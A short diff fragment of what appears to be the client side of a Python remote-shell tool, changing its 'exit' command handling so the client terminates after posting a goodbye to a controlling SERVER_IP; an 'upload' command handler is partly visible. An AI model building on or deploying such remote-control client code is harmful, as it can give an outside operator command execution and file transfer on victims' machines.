@@ -37,7 +37,7 @@ def main():
             if cmd == 'exit':
                 requests.post(SERVER_IP + '/bye/' + ID, timeout=10)
                 send({'output': 'client shell deactivated', 'error': '', 'cwd': cwd})
-                continue
+                exit(0)
             
             if cmd == 'upload':
                 filename = payload.get('filename')
